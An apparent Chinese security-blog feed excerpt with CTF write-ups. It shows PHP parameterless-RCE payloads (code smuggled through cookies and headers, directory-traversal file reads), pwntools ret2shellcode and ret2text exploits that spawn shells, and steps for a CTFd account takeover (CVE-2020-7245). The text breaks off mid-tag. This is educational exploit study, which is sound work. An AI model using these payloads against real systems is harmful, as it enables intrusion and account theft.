        <content type="html"><![CDATA[<h3 id="0x-01-源代码分析"><a href="#0x-01-源代码分析" class="headerlink" title="0x 01 源代码分析"></a>0x 01 源代码分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_replace 的主要功能就是限制我们传输进来的必须时纯小写字母的函数，而且不能携带参数，例如print_r(&quot;123&quot;);这种的，是不允许进行传入的</span><br><span class="line">preg_match的主要功能就是过滤函数，把一些常用不带参数的函数关键部分都给过滤了，需要去构造别的方法去执行命令。</span><br></pre></td></tr></table></figure><h3 id="0x-02-解题方法"><a href="#0x-02-解题方法" class="headerlink" title="0x 02 解题方法"></a>0x 02 解题方法</h3><ul><li>http-header传参</li></ul><p>在session_id中设置我们想要输入的RCE，达到传参的目的，但是第一点需要session_start()开启session会话。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload：code&#x3D;eval(hex2bin(session_id(session_start())));</span><br><span class="line">Cookie: PHPSESSID&#x3D;706870696e666f28293b</span><br><span class="line"></span><br><span class="line">### hex(&quot;phpinfo();&quot;)&#x3D;706870696e666f28293b</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200206195207981.png" alt></p><ul><li><p>post/get传入参数</p><p>get_defined_vars()函数</p></li></ul><p>get_defined_vars ( void ) : array 返回由所有已定义变量所组成的数组<br> 此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?code&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200206195944964.png" alt></p><p>​    getallheaders()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paylaod:?code&#x3D;eval(end(getallheaders()));</span><br><span class="line">lxj: phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200206200741938.png" alt></p><p>任意文件读取：dirname() &amp; chdir()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当前目录的目录遍历:?code&#x3D;var_dump(scandir(getcwd()));</span><br><span class="line">目录上跳遍历：?code&#x3D;var_dump(scandir(dirname(getcwd())));、</span><br><span class="line">修改目录：chdir(dirname(getcwd()))</span><br><span class="line">具体参考：https:&#x2F;&#x2F;skysec.top&#x2F;2019&#x2F;03&#x2F;29&#x2F;PHP-Parametric-Function-RCE&#x2F;#%E6%B3%95%E4%BA%94%EF%BC%9Adirname-amp-chdir</span><br></pre></td></tr></table></figure><h3 id="0x-03-例题分析"><a href="#0x-03-例题分析" class="headerlink" title="0x 03 例题分析"></a>0x 03 例题分析</h3><h4 id="3-1-ByteCTF-Boringcode"><a href="#3-1-ByteCTF-Boringcode" class="headerlink" title="3.1 ByteCTF Boringcode"></a>3.1 ByteCTF Boringcode</h4><p>原题部分代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$code &#x3D; file_get_contents($url);</span><br><span class="line">            if (&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z]+\((?R)?\)&#x2F;&#39;, NULL, $code)) &#123;</span><br><span class="line">                if (preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $code)) &#123;</span><br><span class="line">                    echo &#39;bye~&#39;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;error: host not allowed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;error: invalid url&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题加大了很多难度，过滤了这么些东西 <code>/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/</code></p><p>首先利用readfile(end(scandir(“.”))) # </p><p>可以成功读取当前目录下的最后一个文件的，下一步就是绕过”.”</p><p>这里利用了localeconv()函数，函数返回的数组第一位正是我们需要的“.”函数，尝试构造一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(reset(localeconv()))));</span><br></pre></td></tr></table></figure><p>可以成功读取当前目录下的最后一个文件,其他构造点的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))) #46</span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) #46</span><br></pre></td></tr></table></figure><p>参考payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));</span><br><span class="line"># next(scandir(pos(localeconv()))) 返回字符串&#39;..&#39;即当前目录的上一级目录</span><br><span class="line"># 使用chdir()函数，更改目录，返回1的同时，读取目录下的文件</span><br><span class="line"></span><br><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br><span class="line"># 通过chdir修改当前目录，通过localtime()等函数构造chr（46）即“.”达到读取上层目录文件的目的</span><br></pre></td></tr></table></figure><p>官方WP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</span><br></pre></td></tr></table></figure><h4 id="3-2-2019上海市大学生网络安全大赛-decade"><a href="#3-2-2019上海市大学生网络安全大赛-decade" class="headerlink" title="3.2 2019上海市大学生网络安全大赛_decade"></a>3.2 2019上海市大学生网络安全大赛_decade</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">if (!empty($code)) &#123;</span><br><span class="line">        if (&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z]+\((?R)?\)&#x2F;&#39;, NULL, $code)) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $code)) &#123;</span><br><span class="line">            echo &#39;bye~&#39;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;invalid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">        echo &quot;invalid&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>相比Byte发现与Byte的题目很相似，不同的就是正则过滤的更多了，我们就不能使用readfile等方式去读文件了，也不能用time的方式去获取“.”了。首先还是fuzz一下，php中类似readfile的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">var_dump(gettype(get_defined_functions()));</span><br><span class="line">var_dump(count(get_defined_functions()[internal]));</span><br><span class="line">&#x2F;&#x2F; var_dump(preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, &#39;111&#39;));</span><br><span class="line"> </span><br><span class="line">$i_need_func&#x3D;array();</span><br><span class="line">$j&#x3D;0;</span><br><span class="line">for ($i&#x3D;0; $i &lt; count(get_defined_functions()[internal]) ; $i++) &#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|xdebug|prvd|_|-&#x2F;i&#39;, get_defined_functions()[internal][$i])) &#123;</span><br><span class="line">        $i_need_func[$j]&#x3D;get_defined_functions()[internal][$i];</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($i_need_func);</span><br></pre></td></tr></table></figure><p>发现readgzfile这个函数，看一下函数的定义，主要是读取一个压缩文件，不过在本地测试时发现，该函数也可以实现readfile的功能去读取文件。</p><p>字节跳动原payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))))))))));</span><br></pre></td></tr></table></figure><p>将readfile修改为readgzfile,这里不再使用time()函数，使用ord()、hebrevc()等函数构造,在7.0的php环境下：</p><p>首先尝试读取当前目录下的文件，仍然是构造“.”，原来构造的paylod：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(reset(localeconv()))));</span><br></pre></td></tr></table></figure><p>因为题目中正则将“local”给过滤了，所以要换种方法去构造，本地尝试构造：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))));</span><br></pre></td></tr></table></figure><p>但因为sqrt函数被过滤，继续构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ord(hebrevc(crypt(phpversion()))));</span><br></pre></td></tr></table></figure><p>crypt每次加密都是随机的，修改payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))));</span><br></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readgzfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</span><br></pre></td></tr></table></figure><p>极客大挑战 2019</p><p><img src="http://static.zybuluo.com/Pdsdt/el86boz75xe4eu21dt8p9ois/image.png" alt="image.png-130.7kB"></p><p>该函数会获取我们传输中headers的所有信息并以数组形式输出，我们可以将恶意代码写在传输的headers头中，再使用该函数进行包含执行，这样就可以达到我们绕过检测命令执行的目的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#headers : readfile(&quot;theflag.php&quot;);</span><br><span class="line"></span><br><span class="line">eval(end(getallheaders()));</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.cnblogs.com/sylover/p/11863778.html" target="_blank" rel="noopener">https://www.cnblogs.com/sylover/p/11863778.html</a></p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><p><a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/" target="_blank" rel="noopener">http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> tricks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php无参数RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2Shellcode原理及应用</title>
      <link href="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-Ret2Shellcode原理"><a href="#0x-01-Ret2Shellcode原理" class="headerlink" title="0x 01 Ret2Shellcode原理"></a>0x 01 Ret2Shellcode原理</h3><ul><li><p>shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell</p></li><li><p>Shellcode获取的两种方式：自己收集和pwntools自带</p></li><li><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p></li><li><p>示意图</p><p>先写入具有攻击性的汇编片段（shellcode）到栈中，然后劫持程序跳转到shellcode的入口处执行</p></li></ul><p><img src="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120172248877.png" alt></p><h3 id="0x-02-实例分析"><a href="#0x-02-实例分析" class="headerlink" title="0x 02 实例分析"></a>0x 02 实例分析</h3><p>main函数伪代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);  &#x2F;&#x2F;setvbuf用于内存优化</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  strncpy(buf2, &amp;s, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">0x0804852d &lt;+0&gt;:push   ebp</span><br><span class="line">0x0804852e &lt;+1&gt;:mov    ebp,esp</span><br><span class="line">0x08048530 &lt;+3&gt;:and    esp,0xfffffff0</span><br><span class="line">0x08048533 &lt;+6&gt;:add    esp,0xffffff80</span><br><span class="line">0x08048536 &lt;+9&gt;:mov    eax,ds:0x804a060</span><br><span class="line">0x0804853b &lt;+14&gt;:mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">0x08048543 &lt;+22&gt;:mov    DWORD PTR [esp+0x8],0x2</span><br><span class="line">0x0804854b &lt;+30&gt;:mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">0x08048553 &lt;+38&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">0x08048556 &lt;+41&gt;:call   0x8048410 &lt;setvbuf@plt&gt;</span><br><span class="line">0x0804855b &lt;+46&gt;:mov    eax,ds:0x804a040</span><br><span class="line">0x08048560 &lt;+51&gt;:mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">0x08048568 &lt;+59&gt;:mov    DWORD PTR [esp+0x8],0x1</span><br><span class="line">0x08048570 &lt;+67&gt;:mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">0x08048578 &lt;+75&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">0x0804857b &lt;+78&gt;:call   0x8048410 &lt;setvbuf@plt&gt;</span><br><span class="line">0x08048580 &lt;+83&gt;:mov    DWORD PTR [esp],0x8048660</span><br><span class="line">0x08048587 &lt;+90&gt;:call   0x80483e0 &lt;puts@plt&gt;</span><br><span class="line">0x0804858c &lt;+95&gt;:lea    eax,[esp+0x1c]</span><br><span class="line">0x08048590 &lt;+99&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">0x08048593 &lt;+102&gt;:call   0x80483d0 &lt;gets@plt&gt;</span><br><span class="line">0x08048598 &lt;+107&gt;:mov    DWORD PTR [esp+0x8],0x64</span><br><span class="line">0x080485a0 &lt;+115&gt;:lea    eax,[esp+0x1c]</span><br><span class="line">0x080485a4 &lt;+119&gt;:mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">0x080485a8 &lt;+123&gt;:mov    DWORD PTR [esp],0x804a080</span><br><span class="line">0x080485af &lt;+130&gt;:call   0x8048420 &lt;strncpy@plt&gt;</span><br><span class="line">0x080485b4 &lt;+135&gt;:mov    DWORD PTR [esp],0x8048680</span><br><span class="line">0x080485bb &lt;+142&gt;:call   0x80483c0 &lt;printf@plt&gt;</span><br><span class="line">0x080485c0 &lt;+147&gt;:mov    eax,0x0</span><br><span class="line">0x080485c5 &lt;+152&gt;:leave  </span><br><span class="line">0x080485c6 &lt;+153&gt;:ret</span><br></pre></td></tr></table></figure><p>分析strncpy函数的目录字符串地址是0x804a080，运行readelf -S xxx查看bss段位置</p><img src="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120180354508.png" style="zoom:67%;"><p>是一个BSS段，如果可以我们讲shellcode放到bss段中，然后将函数的返回值改为0x804a080，现在还缺少一个条件，就是bss段0x804a080是否有执行权限，我们断点调试下：</p><p>执行b main 进行断点</p><p>执行r 运行程序</p><p>执行vmmap查看是否有执行权限</p><p><img src="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120180629000.png" alt="image-20200120180629000"></p><p>0x804a080的区间是在标红的0x0804a000到0x0804b000，有x执行权限</p><p>第二步：查找程序溢出的偏移量</p><p>重新执行gdb ./ret2shellcode命令加载程序</p><p>执行pattern create 200创建字符串</p><p>执行 r运行</p><p>输入刚才创建的字符串</p><p><img src="https://s1.51cto.com/images/20190416/1555417473535589.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt="https://s1.51cto.com/images/20190416/1555417473535589.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk="></p><p>得到0x41384141地址，我们使用pattern offset 0x41384141来查看偏移，得到112偏移量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">标准库函数strncpy()，可以将一字符串的一部分拷贝到另一个字符串中。</span><br><span class="line"></span><br><span class="line">strncpy()函数有3个参数：</span><br><span class="line"></span><br><span class="line">1.参数是目录字符串。</span><br><span class="line"></span><br><span class="line">2.参数是源字符串;</span><br><span class="line"></span><br><span class="line">3.参数是一个整数。代表要从源字符串拷贝到目标字符串中的字符数。</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch &#x3D; &#39;i386&#39;, os &#x3D; &#39;linux&#39;)</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;ret2shellcode&quot;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">payload &#x3D; shellcode.ljust(112,&#39;a&#39;)+p32(0x804a080)   &#x2F;&#x2F;填充偏移量</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">直接覆盖了main函数的返回地址到0x804a080执行shellcode</span><br></pre></td></tr></table></figure><p>参考链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">缓冲区溢出-基本ROP-ret2shellcode:</span><br><span class="line">https:&#x2F;&#x2F;blog.51cto.com&#x2F;11797152&#x2F;2379738?source&#x3D;dra</span><br><span class="line">pwntools使用简介2:</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;liuyimin&#x2F;p&#x2F;7379985.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Ret2Shellcode原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2Text原理及应用</title>
      <link href="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-Ret2Text原理"><a href="#0x-01-Ret2Text原理" class="headerlink" title="0x 01 Ret2Text原理"></a>0x 01 Ret2Text原理</h3><ul><li>BSS段通常是指用来存放程序中未初始化的全局变量的一块内存区域。BSS段属于静态内存分配。</li><li>Data通常是指用来存放程序中已初始化的全局变量的一块内存区域。数据段属于静态内存分配。</li><li>Text通常是指用来存放程序执行代码的一块内存区域。称为代码段。</li><li>rodata段存放C中的字符串和#define定义的常量</li></ul><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)，使EIP指向具有system(“/bin/sh”)的代码段</p><p><img src="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120145330415.png" alt></p><h3 id="0x-02-实例分析"><a href="#0x-02-实例分析" class="headerlink" title="0x 02 实例分析"></a>0x 02 实例分析</h3><p>ida查看程序中,存在system函数</p><img src="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120145534968.png" style="zoom:50%;"><p>main函数伪代码如下：</p><img src="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120145703503.png" style="zoom: 67%;"><p>首先寻找多少字节能溢出切刚好能够覆盖return addr。我们使用gdb-peda提供的pattern_create和pattern_offset。pattern_create是生成一个字符串模板输入后根据EIP来确定覆盖return addr的长度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_create 200</span><br><span class="line">&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#39;</span><br></pre></td></tr></table></figure><p>然后让程序跑起来输入这串字符串后程序崩溃。根据错误地址计算偏移量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 in ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41384141</span><br><span class="line">1094205761 found at offset: 112</span><br></pre></td></tr></table></figure><p>最终exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;ret2text&quot;)</span><br><span class="line">payload &#x3D; 112 * &#39;a&#39; + p32(0x0804863a)   &#x2F;&#x2F;system函数的入口地址</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Ret2Text原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V&amp;N招新公开赛题解</title>
      <link href="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-HappyCTFd"><a href="#0x-01-HappyCTFd" class="headerlink" title="0x 01 HappyCTFd"></a>0x 01 HappyCTFd</h3><ul><li><p>考点</p><p>CVE-2020-7245</p></li><li><p>解题过程</p></li></ul><ol><li>原理分析：</li></ol><p>注册用户时判断用户是否存在的时候没有对两端空格进行处理，而插入数据库的时候去除了两端的空格。而后在重置密码时，用的又是这个被处理之后的用户名。</p><ol start="2"><li>攻击流程：</li></ol><blockquote><ol><li>利用添加空格绕过限制来注册一个与受害者用户名相同的账号</li><li>生成忘记密码链接发送到自己的邮箱</li><li>将自己的账号的用户名改成与被攻击者不相同的用户名</li><li>用邮箱中收到的链接更改密码即可。</li></ol></blockquote><ol start="3"><li>首先注册一个用户名为 “空格+admin” 的账户。</li></ol><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174410739.png" alt></p><p>然后用隐私窗口打开，发送密码重置邮件</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174705064.png" alt></p><p>之后修改自己的用户名</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174817943.png" alt></p><p>用邮箱中的链接来重置密码</p><p><img 